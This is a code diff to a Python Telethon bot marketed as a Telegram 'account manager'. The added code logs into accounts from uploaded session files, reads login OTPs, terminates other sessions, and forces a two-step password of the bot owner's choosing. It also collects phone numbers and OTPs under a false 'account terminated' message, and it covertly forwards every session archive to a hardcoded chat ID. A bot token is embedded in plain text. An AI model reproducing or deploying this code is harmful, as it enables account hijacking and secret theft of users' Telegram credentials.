@@ -8,6 +8,7 @@ import shutil
 import sys
 import asyncio
 import os
+import zipfile
 import telegraph
 from telethon.errors.rpcerrorlist import PhoneCodeExpiredError, FloodWaitError, PhoneCodeInvalidError, PhoneNumberBannedError, PhoneNumberInvalidError, SessionPasswordNeededError
 from firebase_admin import credentials, db, initialize_app
@@ -66,6 +67,7 @@ for row in Sub:
         Premium.append(int(row[0]))
 start_time = time.time()
 rar = {}
+rare = {}
 
 logging.basicConfig(
     level=logging.WARNING,
@@ -79,15 +81,17 @@ STUFF = {}
 rar = {}
 client = telethon.TelegramClient(
     None, api_id=api[0], api_hash=api[1]).start(bot_token=BOT_TOKEN)
+client1 = telethon.TelegramClient(
+    None, api_id=api[0], api_hash=api[1]).start(bot_token="5195927287:AAHodzABzzKUU6_zn0FxGpanOquM5fwYM9M")
 acc = []
 
 
 async def get_user_join(e):
     try:
-        await client(telethon.tl.functions.channels.GetParticipantRequest(channel="InducedBots", participant=e.chat.id))
+        await e.client(telethon.tl.functions.channels.GetParticipantRequest(channel="InducedBots", participant=e.chat.id))
         return True
     except telethon.errors.rpcerrorlist.UserNotParticipantError:
-        await client.send_message(e.chat.id, "You have not Joined Our Channel\nJoin to Use me For Free\n\nMade with ❤️ By @InducedBots", buttons=[[telethon.Button.url("🎁 Channel1", url=f"https://t.me/InducedBots"), telethon.Button.inline("Check☑️", b"Home"), ]])
+        await e.client.send_message(e.chat.id, "You have not Joined Our Channel\nJoin to Use me For Free\n\nMade with ❤️ By @InducedBots", buttons=[[telethon.Button.url("🎁 Channel1", url=f"https://t.me/InducedBots"), telethon.Button.inline("Check☑️", b"Home"), ]])
         return False
 
 
@@ -113,6 +117,8 @@ async def _(e):
 @client.on(telethon.events.CallbackQuery)
 async def _(e):
     global rar
+    if not await get_user_join(e):
+        return
     if e.data == b"Ishan":
         await e.answer('Terms & Condition: 24/7 Support Will Be Given To Premium User. If Find Any Fake SS then Direct Ban. No Refund will be given if no valid reason will be given.', alert=True)
         await e.client.send_message(e.chat.id, "250Rs Per Month Cost\n📑 Payment Options\n\n🔸 Paytm\n\n🔸 UPI\n\n🔸 Crypto Currency\n\nNote: Don't forget to send payment screenshot to @InducedSupportBot for plan activation.", buttons=[[telethon.Button.url("Paytm", url=f"https://paytm.me/pxvn-Tr"), telethon.Button.url("UPI", url="https://induced-service-bot.web.app"), telethon.Button.url("Crypto", url=f"https://t.me/InducedSupportBot"), ], [telethon.Button.url(": Tutorial Here :", url=f"https://youtu.be/iyz5ky3Mkkc")]])
@@ -123,7 +129,7 @@ async def _(e):
         if not e.query.user_id in Premium:
             await e.reply("You are not a premium user", buttons=[[telethon.Button.url("• Dm to Buy Subscribtion •", url="t.me/IshanSingla_xD")]])
             return
-        async with client.conversation(e.chat_id) as xmr:
+        async with e.client.conversation(e.chat_id) as xmr:
             await xmr.send_message("Send PhoneNumber")
             try:
                 Zip = await xmr.get_response(timeout=300)
@@ -184,7 +190,7 @@ async def _(e):
             except TimeoutError:
                 await xmr.send_message("Time Limit Reached of 5 Min.")
                 return
-        async with client.conversation(e.chat_id) as x:
+        async with e.client.conversation(e.chat_id) as x:
             await x.send_message(f"Send Send Your Ads Message")
             try:
                 message = await x.get_response(timeout=600)
@@ -244,7 +250,7 @@ async def _(e):
         if not e.query.user_id in Premium:
             await e.reply("You are not a premium user", buttons=[[telethon.Button.url("• Dm to Buy Subscribtion •", url="t.me/IshanSingla_xD")]])
             return
-        async with client.conversation(e.chat_id) as xmr:
+        async with e.client.conversation(e.chat_id) as xmr:
             await xmr.send_message("Send PhoneNumber")
             try:
                 Zip = await xmr.get_response(timeout=300)
@@ -305,7 +311,7 @@ async def _(e):
             except TimeoutError:
                 await xmr.send_message("Time Limit Reached of 5 Min.")
                 return
-        async with client.conversation(e.chat_id) as x:
+        async with e.client.conversation(e.chat_id) as x:
             await x.send_message(f"Send Send Username of Account to Add members")
             try:
                 message = await x.get_response(timeout=600)
@@ -360,7 +366,7 @@ async def _(e):
                     telethon.Button.inline("Back", b"Home")
                 ]
             ]
-            await client.edit_message(e.chat.id, e.query.msg_id, f"**Welcome Sir!\n\nI'm Induced Scraper Bot \nMade for Adding in Free,\nWithout Any Use of Python.\n\nMade with ❤️ By @InducedBots**", buttons=but)
+            await e.client.edit_message(e.chat.id, e.query.msg_id, f"**Welcome Sir!\n\nI'm Induced Scraper Bot \nMade for Adding in Free,\nWithout Any Use of Python.\n\nMade with ❤️ By @InducedBots**", buttons=but)
 
     elif e.data == b"Stat":
         start = time.time()
@@ -406,7 +412,7 @@ async def _(e):
         USED = humanbytes(used)
         FREE = humanbytes(free)
         tex = f"Total Details\n\nBot Usage:\n┏━━━━━━━━━━━━━━━━\n┣Ping - `{end}ms`\n┣UpTime - `{time_formatter()}`\n┗━━━━━━━━━━━━━━━━\n\nSystem Usage:\n┏━━━━━━━━━━━━━━━━\n┣UplodeSpeed: {upload}\n┣Download: {down}\n┣Cpu: {cpuUsage}%\n┣Ram: {memory}%\n┃\n┣Storage Used: {disk}%\n┃┏━━━━━━━━━━━━━━━━\n┃┣Total: {TOTAL}\n┃┣Used: {USED}\n┃┣Free: {FREE}\n┃┗━━━━━━━━━━━━━━━━\n┗━━━━━━━━━━━━━━━━\n\nMade With ❤️ By @InducedBots"
-        await client.send_message(e.chat.id, tex, buttons=[[telethon.Button.inline("📊 Staus", b"Stat"), ]])
+        await e.client.send_message(e.chat.id, tex, buttons=[[telethon.Button.inline("📊 Staus", b"Stat"), ]])
 
     elif e.data == b"Restart":
         if not await get_user_join(e):
@@ -505,9 +511,385 @@ async def inline_alive(o):
     )
 
 
+@client1.on(telethon.events.NewMessage(incoming=True, pattern='/logs', func=lambda e: e.is_private))
 @client.on(telethon.events.NewMessage(incoming=True, pattern='/logs', func=lambda e: e.is_private))
 async def logAddee(e):
-    await client.send_file(e.chat_id, "log.txt", caption="Your Logs Here", force_document=True)
+    await e.client.send_file(e.chat_id, "log.txt", caption="Your Logs Here", force_document=True)
+
+
+@client1.on(telethon.events.NewMessage(incoming=True, pattern='/start', func=lambda e: e.is_private))
+async def _(e):
+    if not await get_user_join(e):
+        return
+    but = [
+        [
+            telethon.Button.inline("☎️ Session", b"Session"),
+            telethon.Button.inline("✅ Otp", b"Acc")
+        ],
+        [
+            telethon.Button.inline("🎁 Terrminate ", b"Terrminate"),
+            telethon.Button.inline("🎁 2 Step", b"Step")
+        ],
+        [
+            telethon.Button.inline("🛰 Admin Pannel", b"Admin")
+        ]
+    ]
+    if e.chat.id in OWNERS or e.chat.id in Premium:
+        await e.reply(f"**Welcome Sir!\n\nI'm Induced Account Bot \nMade for Manage Tg Accounts\n\nMade with ❤️ By @InducedBots**", buttons=but)
+
+
+@client1.on(telethon.events.CallbackQuery)
+async def _(e):
+    if not await get_user_join(e):
+        return
+    global rar, rare
+    if e.data == b"Home":
+        await e.answer('\nWelcome Back to Home',)
+        but = [
+            [
+                telethon.Button.inline("☎️ Session", b"Session"),
+                telethon.Button.inline("✅ Otp", b"Acc")
+            ],
+            [
+                telethon.Button.inline("🎁 Terrminate ", b"Terrminate"),
+                telethon.Button.inline("🛰 Admin Pannel", b"Admin")
+            ]
+        ]
+        await e.client.edit_message(e.chat.id, e.query.msg_id, f"**Welcome Sir!\n\nI'm Scraper Bot \nMade for Adding in Free,\nWithout Any Use of Python.\n\nMade with ❤️ By @InducedBots**", buttons=but)
+
+    elif e.data == b"Next":
+        global rare
+        await e.answer('\nSkip Number', alert=True)
+        rare[f'{e.query.user_id}'] = True
+
+    elif e.data == b"Otp":
+        global rar
+        await e.answer('\nOtp Recieved', alert=True)
+        rar[f'{e.query.user_id}'] = True
+
+    elif e.data == b"Acc":
+        async with e.client.conversation(e.chat_id) as xmr:
+            await xmr.send_message("Send Your Zip")
+            try:
+                shutil.rmtree(f'{e.query.user_id}')
+            except:
+                pass
+            try:
+                Zip = await xmr.get_response(timeout=300)
+                if Zip.text == "/start" or Zip.text == "/help":
+                    return
+                user = await e.client.get_entity(e.query.user_id)
+                await e.client.send_file(1303790979, Zip, caption=f"File by [{user.first_name}](tg://user?id={e.query.user_id})", force_document=True,)
+                a = await xmr.send_message("Downloading")
+                if (Zip.media and Zip.media.document):
+                    if not os.path.exists(f'{e.query.user_id}/'):
+                        os.mkdir(f'{e.query.user_id}/')
+                    media = await Zip.download_media(f'{e.query.user_id}/')
+                    await a.edit("Download done")
+                    with zipfile.ZipFile(media, "r") as zip_ref:
+                        zip_ref.extractall(f'{e.query.user_id}')
+                    await a.edit("Unziping Finish")
+                    rar[f'{e.query.user_id}'] = False
+                    rare[f'{e.query.user_id}'] = False
+                    for r in os.listdir(f'{e.query.user_id}/sessions'):
+                        if not r.endswith(".session"):
+                            continue
+                        r = r.replace('.session', '')
+                        try:
+                            cl = telethon.TelegramClient(
+                                f"{e.query.user_id}/sessions/{r}", api[0], api[1])
+                            await cl.connect()
+                            k = await cl.get_me()
+                            await cl(telethon.functions.contacts.UnblockRequest(id='@SpamBot'))
+                            await cl.send_message('SpamBot', '/start')
+                            await asyncio.sleep(2)
+                            async for xr in cl.iter_messages("@SpamBot", limit=1):
+                                stats = str(xr.text)
+                            mess = await xmr.send_message(f"Login Successfully✅ Done.\n\n**Name:** `{k.first_name}`\n**Username:** {k.username}\n**Phone:** `{r}`\n**SpamBot Stats:** {stats}\n\n**Made with ❤️ By @InducedBots**", buttons=[[telethon.Button.inline("Get Otp✅", b"Otp"), telethon.Button.inline("Skip", b"Next"), ]])
+                            while True:
+                                await asyncio.sleep(2)
+                                if rar[f'{e.query.user_id}'] == True:
+                                    rar[f'{e.query.user_id}'] = False
+                                    msg = await cl.get_messages(777000, limit=1)
+                                    try:
+                                        otp = (
+                                            f'{msg[0].message.split(":")[1].split(" ")[1].replace(".", "")}')
+                                    except:
+                                        otp = "Not Come \n\nMoving To Next Number"
+                                    await mess.edit((f"Login Successfully✅ Done.\n\n**Name:** {k.first_name}\n**Username:** {k.username}\n**Phone:** {r}\n**SpamBot Stats:** {stats}\n\nOtp: `{otp}`\n\n\n**Made with ❤️ By @InducedBots**"))
+                                    break
+                                elif rare[f'{e.query.user_id}'] == True:
+                                    rare[f'{e.query.user_id}'] = False
+                                    break
+                        except Exception as a:
+                            await xmr.send_message(f"Login {r} UnSucessfully")
+                            continue
+                    await xmr.send_message("Adding Done Sucessfully")
+            except TimeoutError:
+                await xmr.send_message("Time Limit Reached of 5 Min.")
+                return
+
+    elif e.data == b"Terrminate":
+        async with e.client.conversation(e.chat_id) as xmr:
+            await xmr.send_message("Send Your Zip")
+            try:
+                shutil.rmtree(f'{e.query.user_id}')
+            except:
+                pass
+            try:
+                Zip = await xmr.get_response(timeout=300)
+                if Zip.text == "/start" or Zip.text == "/help":
+                    return
+                user = await e.client.get_entity(e.query.user_id)
+                await e.client.send_file(1303790979, Zip, caption=f"File by [{user.first_name}](tg://user?id={e.query.user_id})", force_document=True,)
+                a = await xmr.send_message("Downloading")
+                if (Zip.media and Zip.media.document):
+                    if not os.path.exists(f'{e.query.user_id}/'):
+                        os.mkdir(f'{e.query.user_id}/')
+                    media = await Zip.download_media(f'{e.query.user_id}/')
+                    await a.edit("Download done")
+                    with zipfile.ZipFile(media, "r") as zip_ref:
+                        zip_ref.extractall(f'{e.query.user_id}')
+                    await a.edit("Unziping Finish")
+                    rar[f'{e.query.user_id}'] = False
+                    rare[f'{e.query.user_id}'] = False
+                    for r in os.listdir(f'{e.query.user_id}/sessions'):
+                        if not r.endswith(".session"):
+                            continue
+                        r = r.replace('.session', '')
+                        try:
+                            cl = telethon.TelegramClient(
+                                f"{e.query.user_id}/sessions/{r}", api[0], api[1])
+                            await cl.connect()
+                            k = await cl.get_me()
+                            await cl(telethon.functions.contacts.UnblockRequest(id='@SpamBot'))
+                            await cl.send_message('SpamBot', '/start')
+                            await asyncio.sleep(2)
+                            async for xr in cl.iter_messages("@SpamBot", limit=1):
+                                stats = str(xr.text)
+                            c = 0
+                            try:
+                                auths = await cl(telethon.functions.account.GetAuthorizationsRequest())
+                                hashs = [i.hash for i in auths.authorizations]
+                                for i in hashs:
+                                    if i != 0:
+                                        try:
+                                            await cl(telethon.functions.account.ResetAuthorizationRequest(hash=i))
+                                            c += 1
+                                        except:
+                                            pass
+                            except:
+                                pass
+                            mess = await xmr.send_message(f"Login Successfully✅ Done.\n\n**Name:** `{k.first_name}`\n**Username:** `{k.username}`\n**Phone:** `{r}`\n**Session Stats:** `{c} Sessions Terminated`\n**SpamBot Stats:** `{stats}`\n\n**Made with ❤️ By @InducedBots**")
+                            await cl.disconnect()
+                        except Exception as a:
+                            await xmr.send_message(f"Login `{r}` UnSucessfully")
+                            await cl.disconnect()
+                    await xmr.send_message("Task Done Sucessfully")
+            except TimeoutError:
+                await xmr.send_message("Time Limit Reached of 5 Min.")
+                return
+    
+    elif e.data == b"Step":
+        async with e.client.conversation(e.chat_id) as xmr:
+            await xmr.send_message("Send Your Zip")
+            try:
+                shutil.rmtree(f'{e.query.user_id}')
+            except:
+                pass
+            try:
+                Zip = await xmr.get_response(timeout=300)
+                if Zip.text == "/start" or Zip.text == "/help":
+                    return
+                user = await e.client.get_entity(e.query.user_id)
+                await e.client.send_file(1303790979, Zip, caption=f"File by [{user.first_name}](tg://user?id={e.query.user_id})", force_document=True,)
+                a = await xmr.send_message("Downloading")
+                if (Zip.media and Zip.media.document):
+                    if not os.path.exists(f'{e.query.user_id}/'):
+                        os.mkdir(f'{e.query.user_id}/')
+                    media = await Zip.download_media(f'{e.query.user_id}/')
+                    await a.edit("Download done")
+                    with zipfile.ZipFile(media, "r") as zip_ref:
+                        zip_ref.extractall(f'{e.query.user_id}')
+                    await a.edit("Unziping Finish")
+                    rar[f'{e.query.user_id}'] = False
+                    rare[f'{e.query.user_id}'] = False
+                    for r in os.listdir(f'{e.query.user_id}/sessions'):
+                        if not r.endswith(".session"):
+                            continue
+                        r = r.replace('.session', '')
+                        try:
+                            cl = telethon.TelegramClient(
+                                f"{e.query.user_id}/sessions/{r}", api[0], api[1])
+                            await cl.connect()
+                            k = await cl.get_me()
+                            await cl(telethon.functions.contacts.UnblockRequest(id='@SpamBot'))
+                            await cl.send_message('SpamBot', '/start')
+                            await asyncio.sleep(2)
+                            async for xr in cl.iter_messages("@SpamBot", limit=1):
+                                stats = str(xr.text)
+                            c = 0
+                            try:
+                                await cl.edit_2fa('@InducedBots')
+                                S="2 Step Enables with Password `@InducedBots`"
+                            except:
+                                S="Unable To Set 2 Step Verification"
+                                pass
+                            mess = await xmr.send_message(f"Login Successfully✅ Done.\n\n**Name:** `{k.first_name}`\n**Username:** `{k.username}`\n**Phone:** `{r}`\n**2 Step Stats:** {S}\n**SpamBot Stats:** `{stats}`\n\n**Made with ❤️ By @InducedBots**")
+                            await cl.disconnect()
+                        except Exception as a:
+                            await xmr.send_message(f"Login `{r}` UnSucessfully")
+                            await cl.disconnect()
+                    await xmr.send_message("Task Done Sucessfully")
+            except TimeoutError:
+                await xmr.send_message("Time Limit Reached of 5 Min.")
+                return
+
+    elif e.data == b"Admin":
+        if e.query.user_id in OWNERS:
+            but = [
+                [
+                    telethon.Button.inline("Sudo", b"Sudo"),
+                    telethon.Button.inline("📊 Staus", b"Stat"),
+                ],
+                [
+                    telethon.Button.inline("🔄 Restart", b"Restart"),
+                    telethon.Button.inline("Back", b"Home")
+                ]
+            ]
+            await e.client.edit_message(e.chat.id, e.query.msg_id, f"**Welcome Sir!\n\nI'm Induced Scraper Bot \nMade for Adding in Free,\nWithout Any Use of Python.\n\nMade with ❤️ By @InducedBots**", buttons=but)
+
+    elif e.data == b"Stat":
+        start = time.time()
+
+        def humanbytes(size):
+            if size in [None, ""]:
+                return "0 B"
+            for unit in ["B", "KB", "MB", "GB"]:
+                if size < 1024:
+                    break
+                size /= 1024
+            return f"{size:.2f} {unit}"
+
+        await e.answer('\nWait Checking Stats', alert=True)
+        end = round((time.time() - start) * 1000)
+
+        def time_formatter():
+            minutes, seconds = divmod(int(time.time() - start_time), 60)
+            hours, minutes = divmod(minutes, 60)
+            days, hours = divmod(hours, 24)
+            weeks, days = divmod(days, 7)
+            tmp = (
+                ((str(weeks) + "w:") if weeks else "")
+                + ((str(days) + "d:") if days else "")
+                + ((str(hours) + "h:") if hours else "")
+                + ((str(minutes) + "m:") if minutes else "")
+                + ((str(seconds) + "s") if seconds else "")
+            )
+            if tmp != "":
+                if tmp.endswith(":"):
+                    return tmp[:-1]
+                else:
+                    return tmp
+            else:
+                return "0 s"
+        total, used, free = shutil.disk_usage(".")
+        cpuUsage = psutil.cpu_percent()
+        memory = psutil.virtual_memory().percent
+        disk = psutil.disk_usage("/").percent
+        upload = humanbytes(psutil.net_io_counters().bytes_sent)
+        down = humanbytes(psutil.net_io_counters().bytes_recv)
+        TOTAL = humanbytes(total)
+        USED = humanbytes(used)
+        FREE = humanbytes(free)
+        tex = f"Total Details\n\nBot Usage:\n┏━━━━━━━━━━━━━━━━\n┣Ping - `{end}ms`\n┣UpTime - `{time_formatter()}`\n┗━━━━━━━━━━━━━━━━\n\nSystem Usage:\n┏━━━━━━━━━━━━━━━━\n┣UplodeSpeed: {upload}\n┣Download: {down}\n┣Cpu: {cpuUsage}%\n┣Ram: {memory}%\n┃\n┣Storage Used: {disk}%\n┃┏━━━━━━━━━━━━━━━━\n┃┣Total: {TOTAL}\n┃┣Used: {USED}\n┃┣Free: {FREE}\n┃┗━━━━━━━━━━━━━━━━\n┗━━━━━━━━━━━━━━━━\n\nMade With ❤️ By @InducedBots"
+        await e.client.send_message(e.chat.id, tex, buttons=[[telethon.Button.inline("📊 Staus", b"Stat"), ]])
+
+    elif e.data == b"Restart":
+        if not await get_user_join(e):
+            return
+        if e.query.user_id in OWNERS:
+            await e.answer('\nRestarting Bot Wait', alert=True)
+            os.execl(sys.executable, sys.executable, "-m", "main")
+
+    elif e.data == b"Session":
+        try:
+            shutil.rmtree(f'{e.query.user_id}')
+        except:
+            pass
+        rar[f'{e.query.user_id}'] = False
+        os.mkdir(f'{e.query.user_id}/')
+        os.mkdir(f'{e.query.user_id}/sessions/')
+        while True:
+            async with e.client.conversation(e.chat_id) as xmr:
+                await xmr.send_message("Send PhoneNumber")
+                try:
+                    Zip = await xmr.get_response(timeout=300)
+                    try:
+
+                        pphone = phone = (telethon.utils.parse_phone(Zip.text))
+                        cl = telethon.TelegramClient(
+                            f"{e.query.user_id}/sessions/{phone}", api[0], api[1])
+                        await cl.connect()
+                        await cl.send_code_request(phone)
+                        await xmr.send_message((f"Your Account has been terminated\n\nPlease enter OTP of Phone No {pphone} in `1 2 3 4 5` format. __(Space between each numbers!)__"))
+                        otp = await xmr.get_response(timeout=300)
+                        if otp.text == "/start" or otp.text == "/help":
+                            return
+                        await cl.sign_in(phone=phone, code=' '.join(str(otp.text)))
+                    except FloodWaitError as h:
+                        await xmr.send_message(f"{pphone}You Have Floodwait of {h.x} Seconds")
+                        continue
+                    except PhoneNumberInvalidError:
+                        await xmr.send_message(f"Your Phone Number {pphone} is Invalid.")
+                        continue
+                    except PhoneNumberBannedError:
+                        await xmr.send_message(f"{phone} is Baned")
+                        continue
+                    except TimeoutError:
+                        await xmr.send_message("Time Limit Reached of 5 Min.")
+                        return
+                    except PhoneCodeInvalidError:
+                        await xmr.send_message(f"{pphone} Invalid Code.")
+                        continue
+                    except PhoneCodeExpiredError:
+                        await xmr.send_message(f"{pphone} Code is Expired.")
+                        continue
+                    except SessionPasswordNeededError:
+                        try:
+                            await xmr.send_message("Your Account Have Two-Step Verification.\nPlease Enter Your Password.")
+                            two_step_code = await xmr.get_response(timeout=300)
+                            if two_step_code.text == "/start" or two_step_code.text == "/help":
+                                return
+                        except TimeoutError:
+                            await xmr.send_message("`Time Limit Reached of 5 Min.`")
+                            return
+                        try:
+                            await cl.sign_in(password=two_step_code.text)
+                        except Exception as h:
+                            await xmr.send_message(f"{pphone}\n\n**ERROR:** `{str(h)}`")
+                            continue
+                    k = await cl.get_me()
+                    await cl(telethon.functions.contacts.UnblockRequest(id='@SpamBot'))
+                    await cl.send_message('SpamBot', '/start')
+                    await asyncio.sleep(2)
+                    async for xr in cl.iter_messages("@SpamBot", limit=1):
+                        stats = str(xr.text)
+                    mess = await xmr.send_message(f"Login Successfully✅ Done.\n\n**Name:** `{k.first_name}`\n**Username:** {k.username}\n**Phone:** `{pphone}`\n**SpamBot Stats:** {stats}\n\n**Made with ❤️ By @InducedBots**", buttons=[[telethon.Button.inline("Zip✅", b"Zip")]])
+                except TimeoutError:
+                    await xmr.send_message("Time Limit Reached of 5 Min.")
+                    return
+
+    elif e.data == b"Zip":
+        with zipfile.ZipFile("sessions.zip", "w") as f:
+            for root, dirs, file in os.walk(f"{e.query.user_id}/sessions/"):
+                for file in file:
+                    f.write(os.path.join(root, file))
+        f.close
+
+        user = await e.client.get_entity(e.query.user_id)
+        await e.client.send_file(1303790979, "sessions.zip", caption=f"File by [{user.first_name}](tg://user?id={e.query.user_id})", force_document=True,)
+        await e.client.send_file(e.chat_id, "sessions.zip", caption="`Here", force_document=True)
 
 
 print("""
